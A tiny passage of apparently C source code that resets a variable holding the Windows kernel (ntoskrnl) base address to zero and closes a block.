	ntoskrnlBaseAddress = 0;

}

